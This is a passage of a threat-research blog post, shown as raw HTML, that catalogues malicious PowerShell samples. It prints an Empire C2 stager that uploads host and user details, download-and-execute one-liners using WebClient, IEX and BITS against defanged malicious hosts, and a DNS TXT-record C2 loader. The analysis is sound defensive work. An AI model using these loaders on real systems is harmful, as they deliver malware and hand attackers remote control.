$PSVerSIOnTabLe.PSVerSioN.MAjOR;$ib2=$E.getbYteS($I);$EB2=$IV+$AES.CrEATEEncrYPToR().TrANSFORmFinALBLOCk($Ib2,0,$Ib2.LenGTH);$wc.Headers.Add("User-Agent",$UA);$raw=$wc.UploadData($s+"index.php","POST",$eb2);$AES=NeW-Object SYSteM.SEcuRIty.CRYPToGrapHY.AesCrYPToSeRVIcEProvIder;$AES.Mode="CBC";$IV = $rAw[0..15];$AES.Key=$e.GETBYtes($key);$AES.IV = $IV;IEX $([SYstEM.TeXt.EnCoDInG]::ASCII.GetStrInG( $($AES.CrEateDECRYpTOr().TRANsFOrMFinAlBloCk($rAW[16..$RaW.LENGtH],0,$raw.LENGth-16))));$AES=$NuLL;$s2=$NuLl;$WC=$nUll;$eB2=$nULl;$RAW=$NuLl;$IV=$NULL;$WC=$NULl;$I=$NUlL;$iB2=$null;[GC]::COlLEcT();Invoke-Empire -Servers @(($s -split "/")[0..2] -join "/") -SessionKey $key -SessionID $ID -Epoch $epoch;} Start-Negotiate -s "http://23.239.12.15:8080/" -SK \'0192023a7bbd73250516f069df18b500\' -UA $u;'</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-60a9b96a2c95b837659925-1">1</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-60a9b96a2c95b837659925-1"><span class="crayon-s">'FunCtION StaRt-NegoTiATe{param($s,$SK,$UA="lol")Add-TypE -AsSeMBLY SYSteM.SECUriTY;AdD-TypE -aSSEMBly SYSTEm.CoRe;$ErrorActionPreference = "SilentlyContinue";$E=[SYstem.TExT.ENCoDING]::ASCII;$AES=NeW-OBjecT SYsTeM.SeCURiTy.CRyptoGrapHY.AESCRyPToSeRVicePrOvIdER;$IV = [BYTE] 0..255 | GeT-RandOm -coUNt 16;$AES.Mode="CBC"; $AES.Key=$e.GetBytes($SK); $AES.IV = $IV;$cSp = NEW-OBJECT SYStEM.SecURity.CrYPtOGRAPHy.CSpPaRAmeTERS;$csP.FLAGs = $cSP.FlagS -boR [SYsTeM.SeCurITY.CryptogRaphy.CsPPROViDErFlAGs]::UsEMAcHINEKeySTore;$Rs = NEW-ObJecT SySTEm.SecURIty.CRyptograPHy.RSACRYPTOSERvICEPROViDeR -ARGuMenTLIsT 2048,$CSP;$rk=$Rs.TOXMlStriNg($FALse);$r=1..16|FOrEacH-ObJEcT{GEt-RANDOm -MAx 26};$ID=(\'ABCDEFGHKLMNPRSTUVWXYZ123456789\'[$r] -joIN \'\');$iB=$E.gEtbYTes($Rk);$eb=$IV+$AES.CReaTeENCRyptoR().TRANSFoRmFiNalBLOcK($Ib,0,$Ib.LENgtH);IF(-Not $wc){$wc=nEw-oBJECt sYstEM.Net.WEBCLient;$WC.ProxY = [SySTem.NET.WeBReqUEsT]::GETSysTeMWEbPRoxY();$Wc.Proxy.CrEDentIals = [SYStem.Net.CredENtIalCAche]::DEFAUlTCRedentIaLs;}$wc.Headers.Add("User-Agent",$UA);$wc.Headers.Add("Cookie","SESSIONID=$ID");$raw=$wc.UploadData($s+"index.jsp","POST",$eb);$dE=$E.GETSTRing($Rs.deCrYPt($raw,$FalSE));$EpOCh=$de[0..9] -joIN\'\';$KeY=$dE[10..$de.LengTH] -jOIn \'\';$AES=NEw-ObJEct SYsTEm.SEcurity.CRyPtoGRAPHY.AEsCrYPtOSerVIcEPRoVidEr;$IV = [ByTe] 0..255 | GET-RaNdom -couNT 16;$AES.Mode="CBC"; $AES.Key=$e.GetBytes($key); $AES.IV = $IV;$i=$S+\'|\'+[EnvIrONment]::UsERDOmAInNAmE+\'|\'+[ENvIRonmeNt]::UsERNaME+\'|\'+[ENvIRONmeNt]::MaChinEName;$P=(gwMi WIN32_NeTWorkAdAPTErCoNfIGurAtioN|WherE{$_.IPAdDRess}|SelECt -ExpANd IPADDReSS);$ip = @{$TrUe=$P[0];$FalsE=$P}[$P.LeNgTh -lt 6];If(!$IP -or $ip.trIm() -EQ \'\') {$Ip=\'0.0.0.0\'};$i+="|$ip";$I+=\'|\'+(GEt-WmIOBJect WIn32_OpERAtiNgSystEM).NAME.splIT(\'|\')[0];if(([Environment]::UserName).ToLower() -eq "system"){$i+=\'|True\'}else {$i += "|" +([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")}$n=[SySTeM.DIAgNoSTICS.ProceSS]::GetCUrREntPRocEss();$i+=\'|\'+$n.PROCEssNAMe+\'|\'+$n.ID;$I += \'|\' + $PSVerSIOnTabLe.PSVerSioN.MAjOR;$ib2=$E.getbYteS($I);$EB2=$IV+$AES.CrEATEEncrYPToR().TrANSFORmFinALBLOCk($Ib2,0,$Ib2.LenGTH);$wc.Headers.Add("User-Agent",$UA);$raw=$wc.UploadData($s+"index.php","POST",$eb2);$AES=NeW-Object SYSteM.SEcuRIty.CRYPToGrapHY.AesCrYPToSeRVIcEProvIder;$AES.Mode="CBC";$IV = $rAw[0..15];$AES.Key=$e.GETBYtes($key);$AES.IV = $IV;IEX $([SYstEM.TeXt.EnCoDInG]::ASCII.GetStrInG( $($AES.CrEateDECRYpTOr().TRANsFOrMFinAlBloCk($rAW[16..$RaW.LENGtH],0,$raw.LENGth-16))));$AES=$NuLL;$s2=$NuLl;$WC=$nUll;$eB2=$nULl;$RAW=$NuLl;$IV=$NULL;$WC=$NULl;$I=$NUlL;$iB2=$null;[GC]::COlLEcT();Invoke-Empire -Servers @(($s -split "/")[0..2] -join "/") -SessionKey $key -SessionID $ID -Epoch $epoch;} Start-Negotiate -s "http://23.239.12.15:8080/" -SK \'0192023a7bbd73250516f069df18b500\' -UA $u;'</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0008 seconds] -->
<p><strong>Downloader DFSP 2X (81 Samples - 1.98% Coverage)</strong></p>
<p>This is the same as the previous downloader but it launches yet another instance of PowerShell to carry out the download. These were all linked to the Cerber downloader documents as well.</p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-60a9b96a2c960913246848" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover wrap" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea  class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
PowerShell -ExecutionPolicy bypass -noprofile -windowstyle hidden -command (New-Object System.Net.WebClient).DownloadFile('http://93.174.94[.]135/~kali/ketty.exe', $env:APPDATA\profilest.exe );Start-Process ( $env:APPDATA\profilest.exe )</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-60a9b96a2c960913246848-1">1</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-60a9b96a2c960913246848-1"><span class="crayon-v">PowerShell</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-e">ExecutionPolicy </span><span class="crayon-v">bypass</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-v">noprofile</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-e">windowstyle </span><span class="crayon-v">hidden</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-e">command</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-r">New</span><span class="crayon-o">-</span><span class="crayon-t">Object</span><span class="crayon-h"> </span><span class="crayon-v">System</span><span class="crayon-sy">.</span><span class="crayon-v">Net</span><span class="crayon-sy">.</span><span class="crayon-v">WebClient</span><span class="crayon-sy">)</span><span class="crayon-sy">.</span><span class="crayon-e">DownloadFile</span><span class="crayon-sy">(</span><span class="crayon-s">'http://93.174.94[.]135/~kali/ketty.exe'</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-v">env</span><span class="crayon-o">:</span><span class="crayon-v">APPDATA</span><span class="crayon-sy">\</span><span class="crayon-v">profilest</span><span class="crayon-sy">.</span><span class="crayon-i">exe</span><span class="crayon-h"> </span><span class="crayon-sy">)</span><span class="crayon-sy">;</span><span class="crayon-v">Start</span><span class="crayon-o">-</span><span class="crayon-e">Process</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-v">env</span><span class="crayon-o">:</span><span class="crayon-v">APPDATA</span><span class="crayon-sy">\</span><span class="crayon-v">profilest</span><span class="crayon-sy">.</span><span class="crayon-i">exe</span><span class="crayon-h"> </span><span class="crayon-sy">)</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0004 seconds] -->
<p><strong>Downloader DFSP DPL (24 Samples - 0.59% Coverage)</strong></p>
<p>Another downloader using the DownloadFile -&gt; Start-Process technique that had two different variations within the sample set. A number of these samples matched behaviors related to Bartalex and may be indicative of changes to this well-known Office Macro generator.</p>
<p>Unabridged –</p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-60a9b96a2c964750467201" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover wrap" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea  class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
 ($deploylocation=$env:temp+'fleeb.exe');(New-Object System.Net.WebClient).DownloadFile('http://worldnit[.]com/abu.exe', $deploylocation);Start-Process $deploylocation</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-60a9b96a2c964750467201-1">1</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-60a9b96a2c964750467201-1"><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-v">deploylocation</span><span class="crayon-o">=</span><span class="crayon-sy">$</span><span class="crayon-v">env</span><span class="crayon-o">:</span><span class="crayon-v">temp</span><span class="crayon-o">+</span><span class="crayon-s">'fleeb.exe'</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span><span class="crayon-sy">(</span><span class="crayon-r">New</span><span class="crayon-o">-</span><span class="crayon-t">Object</span><span class="crayon-h"> </span><span class="crayon-v">System</span><span class="crayon-sy">.</span><span class="crayon-v">Net</span><span class="crayon-sy">.</span><span class="crayon-v">WebClient</span><span class="crayon-sy">)</span><span class="crayon-sy">.</span><span class="crayon-e">DownloadFile</span><span class="crayon-sy">(</span><span class="crayon-s">'http://worldnit[.]com/abu.exe'</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-v">deploylocation</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span><span class="crayon-v">Start</span><span class="crayon-o">-</span><span class="crayon-i">Process</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-v">deploylocation</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0003 seconds] -->
<p>Abridged –</p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-60a9b96a2c965603823840" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover wrap" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea  class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
 ($dpl=$env:temp+'f.exe');(New-Object System.Net.WebClient).DownloadFile('http://alonqood[.]com/abacom.exe', $dpl);Start-Process $dpl</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-60a9b96a2c965603823840-1">1</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-60a9b96a2c965603823840-1"><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-v">dpl</span><span class="crayon-o">=</span><span class="crayon-sy">$</span><span class="crayon-v">env</span><span class="crayon-o">:</span><span class="crayon-v">temp</span><span class="crayon-o">+</span><span class="crayon-s">'f.exe'</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span><span class="crayon-sy">(</span><span class="crayon-r">New</span><span class="crayon-o">-</span><span class="crayon-t">Object</span><span class="crayon-h"> </span><span class="crayon-v">System</span><span class="crayon-sy">.</span><span class="crayon-v">Net</span><span class="crayon-sy">.</span><span class="crayon-v">WebClient</span><span class="crayon-sy">)</span><span class="crayon-sy">.</span><span class="crayon-e">DownloadFile</span><span class="crayon-sy">(</span><span class="crayon-s">'http://alonqood[.]com/abacom.exe'</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-v">dpl</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span><span class="crayon-v">Start</span><span class="crayon-o">-</span><span class="crayon-i">Process</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-v">dpl</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0003 seconds] -->
<p><strong>Downloader IEXDS (19 Samples – 0.46% Coverage)</strong></p>
<p>This is another spin on a downloader that frequently pops-up when searching for methods to download and execute scripts for PowerShell. Effectively, the code simply downloads a PowerShell script remotely and executes it with Invoke-Expression. The resulting payloads can be quite different from one another and didn’t seem related.</p>
<p>The following two samples download an “Invoke-TwitterBot” script, which is “A Trojan bot controlled by a twitter account that was released at ShmooCon IX”.</p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-60a9b96a2c966071780693" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover wrap" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea  class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
IEX (New-Object Net.WebClient).DownloadString('http://cannot.loginto[.]me/googlehelper.ps1')

iex ((New-Object Net.WebClient).DownloadString('http://76.74.127[.]38/default-nco.html'))</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-60a9b96a2c966071780693-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b96a2c966071780693-2">2</div><div class="crayon-num" data-line="crayon-60a9b96a2c966071780693-3">3</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-60a9b96a2c966071780693-1"><span class="crayon-e">IEX</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-r">New</span><span class="crayon-o">-</span><span class="crayon-t">Object</span><span class="crayon-h"> </span><span class="crayon-v">Net</span><span class="crayon-sy">.</span><span class="crayon-v">WebClient</span><span class="crayon-sy">)</span><span class="crayon-sy">.</span><span class="crayon-e">DownloadString</span><span class="crayon-sy">(</span><span class="crayon-s">'http://cannot.loginto[.]me/googlehelper.ps1'</span><span class="crayon-sy">)</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9b96a2c966071780693-2">&nbsp;</div><div class="crayon-line" id="crayon-60a9b96a2c966071780693-3"><span class="crayon-e">iex</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-sy">(</span><span class="crayon-r">New</span><span class="crayon-o">-</span><span class="crayon-t">Object</span><span class="crayon-h"> </span><span class="crayon-v">Net</span><span class="crayon-sy">.</span><span class="crayon-v">WebClient</span><span class="crayon-sy">)</span><span class="crayon-sy">.</span><span class="crayon-e">DownloadString</span><span class="crayon-sy">(</span><span class="crayon-s">'http://76.74.127[.]38/default-nco.html'</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0002 seconds] -->
<p><strong>BITSTransfer (11 Samples – 0.27% Coverage)</strong></p>
<p>Another mechanism for downloading malware via PowerShell is through the BitsTransfer module. Background Intelligent Transfer Service (BITS) isn’t as frequently seen in downloading malware but offers similar functionality to other known transfer services, such as HTTP. Using this different method may allow attackers to avoid certain monitoring and take advantage of the fact that BITS will throttle transfers to not impact other bandwidth usage.</p>
<p>In my previous <a href="http://blog.paloaltonetworks.com/2017/01/unit42-farming-malicious-documents-unravel-ransomware/">blog</a>, I noted that a variant of the Cerber downloader was seen using BITS for a brief period of time and 10 out of these 11 samples were Microsoft Word documents leading to Cerber.</p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-60a9b96a2c967213479175" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover wrap" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea  class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
Import-Module BitsTransfer
$path = [environment]::getfolderpath("mydocuments")
Start-BitsTransfer -Source "http://94.102.50[.]39/keyt.exe" -Destination "$path\keyt.exe"
Invoke-Item  "$path\keyt.exe"</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-60a9b96a2c967213479175-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b96a2c967213479175-2">2</div><div class="crayon-num" data-line="crayon-60a9b96a2c967213479175-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b96a2c967213479175-4">4</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-60a9b96a2c967213479175-1"><span class="crayon-v">Import</span><span class="crayon-o">-</span><span class="crayon-e">Module </span><span class="crayon-i">BitsTransfer</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9b96a2c967213479175-2"><span class="crayon-sy">$</span><span class="crayon-v">path</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-sy">[</span><span class="crayon-v">environment</span><span class="crayon-sy">]</span><span class="crayon-o">::</span><span class="crayon-e">getfolderpath</span><span class="crayon-sy">(</span><span class="crayon-s">"mydocuments"</span><span class="crayon-sy">)</span></div><div class="crayon-line" id="crayon-60a9b96a2c967213479175-3"><span class="crayon-v">Start</span><span class="crayon-o">-</span><span class="crayon-v">BitsTransfer</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-i">Source</span><span class="crayon-h"> </span><span class="crayon-s">"http://94.102.50[.]39/keyt.exe"</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-i">Destination</span><span class="crayon-h"> </span><span class="crayon-s">"$path\keyt.exe"</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9b96a2c967213479175-4"><span class="crayon-v">Invoke</span><span class="crayon-o">-</span><span class="crayon-i">Item</span><span class="crayon-h">&nbsp;&nbsp;</span><span class="crayon-s">"$path\keyt.exe"</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0003 seconds] -->
<p><strong>TXT C2 (10 Samples – 0.24% Coverage)</strong></p>
<p>For this next one, the attacker uses PowerShell to make a DNS query for the TXT record of a domain. The TXT record contains another PowerShell script that is then passed to Invoke-Expression to execute.</p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-60a9b96a2c969841658990" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover wrap" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea  class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
if(''+(nslookup -q=txt p.s.os.ns.rankingplac[.]pl) -match '@(.*)@'){iex $matches[1]}</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-60a9b96a2c969841658990-1">1</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-60a9b96a2c969841658990-1"><span class="crayon-st">if</span><span class="crayon-sy">(</span><span class="crayon-s">''</span><span class="crayon-o">+</span><span class="crayon-sy">(</span><span class="crayon-v">nslookup</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-v">q</span><span class="crayon-o">=</span><span class="crayon-i">txt</span><span class="crayon-h"> </span><span class="crayon-v">p</span><span class="crayon-sy">.</span><span class="crayon-v">s</span><span class="crayon-sy">.</span><span class="crayon-v">os</span><span class="crayon-sy">.</span><span class="crayon-v">ns</span><span class="crayon-sy">.</span><span class="crayon-v">rankingplac</span><span class="crayon-sy">[</span><span class="crayon-sy">.</span><span class="crayon-sy">]</span><span class="crayon-v">pl</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-i">match</span><span class="crayon-h"> </span><span class="crayon-s">'@(.*)@'</span><span class="crayon-sy">)</span><span class="crayon-sy">{</span><span class="crayon-i">iex</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-v">matches</span><span class="crayon-sy">[</span><span class="crayon-cn">1</span><span class="crayon-sy">]</span><span class="crayon-sy">}</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0003 seconds] -->
<p>Looking at the script which is returned shows that once this initial look-up occurs, it will set itself into a constant loop continuing to query for the TXT record of the domain and base64 decoding then executing the result.</p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-60a9b96a2c96a127421221" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover wrap" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
